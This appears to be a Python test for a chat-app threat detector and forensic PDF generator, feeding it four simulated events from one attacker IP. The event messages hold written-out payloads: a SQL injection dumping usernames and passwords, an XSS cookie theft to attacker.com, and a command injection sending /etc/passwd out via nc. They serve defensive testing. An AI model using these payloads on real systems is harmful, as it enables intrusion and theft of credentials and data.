import os
from datetime import datetime
from models import AuditEvent
from detector import ThreatDetector
from forensics import ForensicInvestigator
from pdf_generator import generate_forensic_pdf

def test_threat_simulation():
    print("[*] Generating simulated attack payload sequence...")
    
    # Sequence of attack events from a malicious visitor
    simulated_events = [
        AuditEvent.from_dict({
            "id": "evt_test_01",
            "timestamp": "2026-10-02T18:00:10.000Z",
            "eventType": "USER_JOIN",
            "ip": "185.220.101.5",
            "userAgent": "sqlmap/1.7.2#stable (https://sqlmap.org)",
            "socketId": "sock_exploit_01",
            "sender": "root_pwn",
            "target": "Global Room",
            "message": "root_pwn connected",
            "isFlagged": False,
            "flags": []
        }),
        AuditEvent.from_dict({
            "id": "evt_test_02",
            "timestamp": "2026-10-02T18:00:15.000Z",
            "eventType": "MESSAGE",
            "ip": "185.220.101.5",
            "userAgent": "sqlmap/1.7.2#stable (https://sqlmap.org)",
            "socketId": "sock_exploit_01",
            "sender": "root_pwn",
            "target": "All",
            "message": "' UNION SELECT null, username, password FROM users--",
            "isFlagged": True,
            "flags": ["sql_injection_attempt"]
        }),
        AuditEvent.from_dict({
            "id": "evt_test_03",
            "timestamp": "2026-10-02T18:00:20.000Z",
            "eventType": "MESSAGE",
            "ip": "185.220.101.5",
            "userAgent": "sqlmap/1.7.2#stable (https://sqlmap.org)",
            "socketId": "sock_exploit_01",
            "sender": "root_pwn",
            "target": "All",
            "message": "<script>fetch('http://attacker.com/steal?c='+document.cookie)</script>",
            "isFlagged": True,
            "flags": ["xss_attempt"]
        }),
        AuditEvent.from_dict({
            "id": "evt_test_04",
            "timestamp": "2026-10-02T18:00:25.000Z",
            "eventType": "MESSAGE",
            "ip": "185.220.101.5",
            "userAgent": "sqlmap/1.7.2#stable (https://sqlmap.org)",
            "socketId": "sock_exploit_01",
            "sender": "root_pwn",
            "target": "All",
            "message": "; cat /etc/passwd | nc 185.220.101.5 4444",
            "isFlagged": True,
            "flags": ["command_injection"]
        })
    ]

    print("[*] Evaluating threat assessment...")
    dossier = ForensicInvestigator.build_dossier_from_events(
        simulated_events, subject_type="IP", subject_value="185.220.101.5"
    )

    print(f"\n[+] Threat Severity: {dossier.threat.severity}")
    print(f"[+] Risk Score: {dossier.threat.risk_score}/100")
    print(f"[+] Detected Indicators: {dossier.threat.indicators}")
    print(f"[+] Explanations:")
    for exp in dossier.threat.explanations:
        print(f"    - {exp}")

    print("\n[*] Compiling Forensic Dossier PDF...")
    pdf_path = generate_forensic_pdf(dossier)
    print(f"[+] Simulated Attack Forensic PDF saved at: {pdf_path}")
    print(f"[+] File size: {os.path.getsize(pdf_path)} bytes")

if __name__ == "__main__":
    test_threat_simulation()
